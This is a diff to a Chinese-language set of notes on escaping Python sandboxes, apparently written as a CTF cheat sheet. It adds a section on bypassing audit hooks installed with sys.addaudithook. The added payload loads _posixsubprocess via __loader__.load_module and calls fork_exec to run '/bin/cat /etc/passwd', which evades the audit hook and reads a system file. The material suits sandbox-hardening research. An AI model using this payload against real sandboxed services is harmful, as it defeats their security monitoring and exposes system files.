@@ -34,4 +34,11 @@ str().join(().__doc__[19],().__doc__[23])
 ```
 
 # 0x03 绕过基于 sys.addaudithook 的 audit hook
-## __loader__.load_module导入模块
+## 方法一
+### \_\_loader\_\_.load_module导入模块
+
+### \_posixsubprocess 执行命令
+payload：
+```python
+__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
+```
